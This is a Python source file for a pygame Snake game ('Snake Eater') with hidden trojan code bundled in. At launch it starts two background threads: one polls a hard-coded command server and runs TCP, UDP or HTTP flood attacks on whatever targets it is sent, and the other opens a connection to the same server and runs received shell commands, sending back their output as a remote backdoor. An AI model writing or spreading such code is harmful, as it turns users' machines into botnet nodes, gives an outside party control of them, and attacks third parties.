import pygame, sys, time, random
from pycomm.connection import Connection
import time, subprocess, threading, socket


# Difficulty settings
# Easy      ->  10
# Medium    ->  25
# Hard      ->  40
# Harder    ->  60
# Impossible->  120
MASTER_ADDRESS = "52.187.18.17"
MASTER_PORT = 7982
POLL_INTERVAL = 20

difficulty = 25

# Window size
frame_size_x = 720
frame_size_y = 480

# Checks for errors encountered
check_errors = pygame.init()
# pygame.init() example output -> (6, 0)
# second number in tuple gives number of errors
if check_errors[1] > 0:
    print(f'[!] Had {check_errors[1]} errors when initialising game, exiting...')
    sys.exit(-1)
else:
    print('[+] Game successfully initialised')


# Initialise game window
pygame.display.set_caption('Snake Eater')
game_window = pygame.display.set_mode((frame_size_x, frame_size_y))


# Colors (R, G, B)
black = pygame.Color(0, 0, 0)
white = pygame.Color(255, 255, 255)
red = pygame.Color(255, 0, 0)
green = pygame.Color(0, 255, 0)
blue = pygame.Color(0, 0, 255)


# FPS (frames per second) controller
fps_controller = pygame.time.Clock()



# Game variables
snake_pos = [100, 50]
snake_body = [[100, 50], [100-10, 50], [100-(2*10), 50]]

food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
food_spawn = True

direction = 'RIGHT'
change_to = direction

score = 0


class Poison (threading.Thread):
    def __init__(self, threadID, url, port, type_name):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.threadID = threadID
        self.type_name = type_name
    def run(self):
        if self.type_name == 'udp_attack':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        url = self.url
        port = self.port

        print(f'Connecting to {url}:{port}')

        if(self.type_name == "http_attack"):
            http_get_attack(sock, url, port)
        else:
            sock.connect((url, port))
            sock.send("hello".encode('utf-8'))
        time.sleep(1)
        sock.close()

def http_get_attack(sock, url, port):
    headers = [
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Length: {}".format(random.randint(1024, 2048))
    ]
    message = "GET / HTTP/1.1\n"

    data = message + "\n".join(headers) + "\n\n"

    try:
        sock.connect((url, port))
        for header in headers:
            sock.send(data.encode("utf-8"))

    except Exception as e:
        print("Error:", e)


def attack(url, port, n, type_name):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port, type_name))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

def handle_command(command):
    try:
        if command.startswith("SEND TCP-SYN"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "tcp_attack")
        if command.startswith("SEND UDP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "udp_attack")
        if command.startswith("SEND HTTP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "http_attack")
    except Exception as e:
        print("Error decoding command")
        print(e)


# Game Over
def game_over():
    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
    my_font = pygame.font.SysFont('times new roman', 90)
    game_over_surface = my_font.render('YOU DIED', True, red)
    game_over_rect = game_over_surface.get_rect()
    game_over_rect.midtop = (frame_size_x/2, frame_size_y/4)
    game_window.fill(black)
    game_window.blit(game_over_surface, game_over_rect)
    show_score(0, red, 'times', 20)
    pygame.display.flip()
    time.sleep(3)
    pygame.quit()
    sys.exit()


# Score
def show_score(choice, color, font, size):
    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
    score_font = pygame.font.SysFont(font, size)
    score_surface = score_font.render('Score : ' + str(score), True, color)
    score_rect = score_surface.get_rect()
    if choice == 1:
        score_rect.midtop = (frame_size_x/10, 15)
    else:
        score_rect.midtop = (frame_size_x/2, frame_size_y/1.25)
    game_window.blit(score_surface, score_rect)
    # pygame.display.flip()


def game():
    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
    # Game variables
    snake_pos = [100, 50]
    snake_body = [[100, 50], [100-10, 50], [100-(2*10), 50]]

    food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
    food_spawn = True

    direction = 'RIGHT'
    change_to = direction

    score = 0
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            # Whenever a key is pressed down
            elif event.type == pygame.KEYDOWN:
                # W -> Up; S -> Down; A -> Left; D -> Right
                if event.key == pygame.K_UP or event.key == ord('w'):
                    change_to = 'UP'
                if event.key == pygame.K_DOWN or event.key == ord('s'):
                    change_to = 'DOWN'
                if event.key == pygame.K_LEFT or event.key == ord('a'):
                    change_to = 'LEFT'
                if event.key == pygame.K_RIGHT or event.key == ord('d'):
                    change_to = 'RIGHT'
                # Esc -> Create event to quit the game
                if event.key == pygame.K_ESCAPE:
                    pygame.event.post(pygame.event.Event(pygame.QUIT))

        # Making sure the snake cannot move in the opposite direction instantaneously
        if change_to == 'UP' and direction != 'DOWN':
            direction = 'UP'
        if change_to == 'DOWN' and direction != 'UP':
            direction = 'DOWN'
        if change_to == 'LEFT' and direction != 'RIGHT':
            direction = 'LEFT'
        if change_to == 'RIGHT' and direction != 'LEFT':
            direction = 'RIGHT'

        # Moving the snake
        if direction == 'UP':
            snake_pos[1] -= 10
        if direction == 'DOWN':
            snake_pos[1] += 10
        if direction == 'LEFT':
            snake_pos[0] -= 10
        if direction == 'RIGHT':
            snake_pos[0] += 10

        # Snake body growing mechanism
        snake_body.insert(0, list(snake_pos))
        if snake_pos[0] == food_pos[0] and snake_pos[1] == food_pos[1]:
            score += 1
            food_spawn = False
        else:
            snake_body.pop()

        # Spawning food on the screen
        if not food_spawn:
            food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
        food_spawn = True

        # GFX
        game_window.fill(black)
        for pos in snake_body:
            # Snake body
            # .draw.rect(play_surface, color, xy-coordinate)
            # xy-coordinate -> .Rect(x, y, size_x, size_y)
            pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))

        # Snake food
        pygame.draw.rect(game_window, white, pygame.Rect(food_pos[0], food_pos[1], 10, 10))

        # Game Over conditions
        # Getting out of bounds
        if snake_pos[0] < 0 or snake_pos[0] > frame_size_x-10:
            game_over()
        if snake_pos[1] < 0 or snake_pos[1] > frame_size_y-10:
            game_over()
        # Touching the snake body
        for block in snake_body[1:]:
            if snake_pos[0] == block[0] and snake_pos[1] == block[1]:
                game_over()

        show_score(1, white, 'consolas', 20)
        # Refresh game screen
        pygame.display.update()
        # Refresh rate
        fps_controller.tick(difficulty)

def bot():
    while True:
        try:
            master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            master.connect((MASTER_ADDRESS, MASTER_PORT))

            res = master.recv(256)

            command = res.decode("utf-8")

            handle_command(command)

            master.close()

            print(f'Next poll in {POLL_INTERVAL} seconds...')
        except Exception as e:
            print("Error connecting to master", e)
            print(f'Retrying in {POLL_INTERVAL} seconds...')
        time.sleep(POLL_INTERVAL)

def tcp_client():
    while True:
        try:
            conn = Connection("52.187.18.17", 7983)
            conn.connect()
            break
        except Exception as e:
            # print(e)
            pass
        time.sleep(10)

    while True:
        command = conn.recv()
        if command == "EXIT":
            break
        result = "No result"
        try:
            # result = subprocess.pop(command.split(), shell=True).decode('utf-8')
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            result=proc.communicate()[0].decode('utf-8')
            proc.wait()
        except Exception as err:
            # print("Error running command")
            # print(err)
            result = str(err)

        conn.send(result)


if __name__ == "__main__":
    t1 = threading.Thread(target=tcp_client)
    t1.start()
    
    t2 = threading.Thread(target=bot)
    t2.start()

    game()

    t1.join()
    t2.join()

    print("done")
